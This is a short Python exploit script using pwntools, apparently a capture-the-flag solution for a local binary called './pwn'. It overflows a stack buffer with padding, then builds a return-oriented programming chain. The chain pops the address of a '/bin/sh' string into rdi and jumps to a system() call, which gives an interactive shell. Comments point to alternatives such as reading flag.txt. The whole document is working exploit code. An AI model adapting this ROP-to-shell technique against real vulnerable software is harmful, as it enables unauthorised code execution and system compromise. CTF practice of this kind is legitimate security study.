#!/bin/python3

from pwn import *

p = process('./pwn')
e = ELF('./pwn')
r = ROP('./pwn')

offset = 0x7ffc5fc4d748 - 0x7ffc5fc4d720

payload = b'A'*offset

# we want to pop the "/bin/sh" string into rdi to be used as a param for system()
payload += p64(r.find_gadget(["pop rdi"]).address)

# the addr of "/bin/sh" string
# you can also use next(e.search(b'/bin/cat flag.txt')) or even only
# next(e.search(b'/bin/cat')), as it will read the string until it is null-terminated
payload += p64(e.sym['whatsThis'])


# where `system` is called in soClose()
payload += p64(e.sym['soClose'] + 19) # you could also use e.plt['system'] 

p.sendline(payload)

p.interactive()
